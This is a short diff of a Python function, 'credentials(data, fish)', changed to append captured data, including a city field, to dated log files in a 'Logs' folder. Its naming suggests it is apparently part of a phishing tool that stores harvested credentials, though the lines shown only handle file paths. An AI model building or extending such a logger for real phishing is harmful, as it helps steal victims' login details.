@@ -1,5 +1,5 @@
 from time import strftime
-
+from os import getcwd
 def credentials(data, fish):
     
     file_name = fish + strftime('-%y%m%d.txt')
@@ -20,6 +20,6 @@ def credentials(data, fish):
             city=data[4].strip()
             )    
     
-    with open(file_name, 'a') as f:
+    with open(getcwd()+'/Logs/'+file_name, 'a') as f:
         f.write(msg)
 
